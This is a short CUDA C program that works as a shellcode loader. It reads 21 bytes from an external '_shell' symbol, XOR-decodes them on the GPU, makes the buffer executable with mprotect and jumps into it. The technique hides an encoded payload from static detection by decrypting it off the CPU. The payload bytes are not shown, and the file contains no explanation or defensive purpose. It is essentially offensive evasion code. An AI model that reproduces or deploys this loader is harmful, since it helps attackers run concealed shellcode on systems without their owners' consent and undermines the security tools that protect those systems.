#include <stdio.h>
#include <sys/mman.h>
#include <cuda.h>

#define len 21

__global__ void decrypt(unsigned char *code){

  int indx = threadIdx.x;
  code[indx] ^= 12;


}

extern "C" void _shell();

int main(void){

  unsigned char *p = (unsigned char*)_shell; 
  unsigned char *d_shell,*h_shell;

  h_shell = (unsigned char *)malloc(sizeof(char)*len);

  int i;
  for(i=0;i<len;i++){
    h_shell[i] = *p;
    p++;
  }
  cudaMalloc((void **) &d_shell, sizeof(char)*len);
  cudaMemcpy(d_shell, h_shell, sizeof(char)*len, cudaMemcpyHostToDevice);
  decrypt<<<1,len>>>(d_shell);
  cudaMemcpy(h_shell, d_shell, sizeof(char)*len, cudaMemcpyDeviceToHost);
  cudaFree(d_shell);
  mprotect(h_shell,len,PROT_EXEC); 

  ((void(*)(void))h_shell)();


}
